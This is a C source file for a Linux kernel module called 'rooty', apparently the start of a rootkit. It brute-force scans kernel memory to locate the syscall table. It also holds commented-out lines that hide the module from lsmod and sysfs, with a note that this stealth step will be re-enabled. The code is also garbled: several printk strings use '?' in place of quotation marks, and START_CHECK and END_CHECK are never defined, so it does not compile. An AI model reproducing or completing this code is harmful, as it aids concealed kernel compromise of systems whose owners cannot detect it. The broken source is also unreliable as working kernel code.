#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
int rooty_init(void);
void rooty_exit(void);
module_init(rooty_init);
module_exit(rooty_exit);

/* find sys_call_table */


typedef unsigned int psize;


psize *sys_call_table;
psize **find(void) {
 psize **sctable;
 psize i = START_CHECK;
 while (i < END_CHECK) {
  sctable = (psize **) i;
  if (sctable[__NR_CLOSE] == (psize *) sys_close) {
   return &sctable[0];
  } 
  i += sizeof(void *);
 }
 return NULL;
}

int rooty_init(void) {
  
/* Hide module from lsmod - commented out for troubleshooting reasons, will be activated again at the end  
  list_del_init(&__this_module.list);
  kobject_del(&THIS_MODULE->mkobj.kobj); */
  
 printk("rooty: module loaded\n");
 
/* added check for sys_call_table found or not  */
  if (sys_call_table = (psize *) find()) {
  printk(?rooty: sys_call_table found at %p\n?,sys_call_table);
  } else {
  printk(?rooty: sys_call_table not found\n?);
  }
 return 0;
}

void rooty_exit(void) {
 printk("rooty: module removed\n");
}
